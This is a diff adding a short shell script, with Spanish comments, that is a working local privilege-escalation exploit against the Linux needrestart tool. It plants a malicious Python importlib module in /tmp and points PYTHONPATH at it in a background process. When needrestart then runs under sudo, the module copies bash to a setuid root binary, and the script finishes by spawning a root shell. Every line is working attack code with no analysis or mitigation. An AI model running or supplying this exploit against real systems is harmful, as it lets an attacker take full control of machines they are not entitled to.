@@ -1,0 +1,30 @@
+# 1. Limpiar e inicializar la estructura
+rm -rf /tmp/malicious /tmp/poc
+mkdir -p /tmp/malicious/importlib
+cd /tmp/malicious
+
+# 2. Crear la librería maliciosa
+cat << 'EOF' > importlib/__init__.py
+import os
+if os.geteuid() == 0:
+    os.system("cp /bin/bash /tmp/poc; chmod 4755 /tmp/poc")
+EOF
+
+# 3. Crear un script de python inofensivo
+cat << 'EOF' > e.py
+import time
+while True:
+    time.sleep(1)
+EOF
+
+# 4. Ejecutar el script en SEGUNDO PLANO para que needrestart lo vea
+PYTHONPATH="/tmp/malicious" python3 e.py &
+
+# 5. Esperar un segundo para asegurar que se está ejecutando
+sleep 1
+
+# 6. Ejecutar needrestart (esto disparará la vulnerabilidad)
+sudo /usr/sbin/needrestart
+
+# 7. Ejecutar la shell root (el -p es para mantener los privilegios)
+/tmp/poc -p
